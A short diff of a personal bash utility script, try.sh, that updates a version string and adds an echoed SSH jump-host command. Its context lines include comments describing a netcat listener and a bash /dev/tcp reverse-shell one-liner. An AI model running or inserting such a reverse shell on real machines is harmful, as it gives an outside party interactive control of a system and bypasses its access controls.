@@ -7,7 +7,7 @@ if [[ ${DEBUG-} =~ ^1|yes|true$ ]]; then
     export PS4='[\D{%FT%TZ}] ${BASH_SOURCE}:${LINENO}: ${FUNCNAME[0]:+${FUNCNAME[0]}(): }'
     set -o xtrace
 fi
-VERSION+=("try.sh - 164ef96 - 2021-10-19T14:04:10+08:00")
+VERSION+=("b38e3c0[2021-10-27T08:51:01+08:00]:try.sh")
 [ -e ${DIRNAME}/functions.sh ] && . ${DIRNAME}/functions.sh || true
 ##################################################
 cleanup() {
@@ -334,6 +334,7 @@ EOF
     # reverse-shell
     # local<192.168.168.A>  run: nc -lp9999
     # remote<192.168.168.B> run: bash -i &> /dev/tcp/192.168.168.A/9999 0>&1
+    echo ssh -p port1 root@ip1 -J ip2:port2
     return 0
 }
 main "$@"
